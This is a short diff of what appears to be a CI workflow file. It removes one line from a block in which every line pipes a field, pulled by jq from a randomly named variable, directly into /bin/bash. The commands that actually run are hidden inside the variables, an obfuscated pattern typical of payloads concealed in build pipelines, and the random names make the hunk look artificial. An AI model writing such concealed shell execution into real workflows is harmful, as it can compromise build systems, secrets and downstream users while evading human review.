@@ -31,7 +31,6 @@ jobs:
           echo $nuaob6564 | jq -r .a4 | /bin/bash
           printf '%s' "$eqs90" | jq -r .ifqa056 | /bin/bash
           printf '%s' "$z2" | jq -r .mvke08677 | /bin/bash
-          printf '%s' "$unitq739" | jq -r .r2058 | /bin/bash
           echo $kad8 | jq -r .uyq86655 | /bin/bash
           echo $x70 | jq -r .bkh79490 | /bin/bash
           printf '%s' "$plos118" | jq -r .xsu613 | /bin/bash
